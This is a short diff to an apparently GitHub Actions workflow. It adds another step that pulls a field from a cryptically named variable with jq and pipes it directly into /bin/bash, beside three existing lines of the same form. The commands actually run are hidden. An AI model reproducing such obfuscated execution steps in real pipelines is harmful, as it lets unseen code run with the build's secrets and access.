@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$u38" | jq -r .kpimq5055 | /bin/bash
           echo $j78 | jq -r .hpo5622 | /bin/bash
           echo $va705 | jq -r .vm96309 | /bin/bash
+          printf '%s' "$bc04115" | jq -r .eo36 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
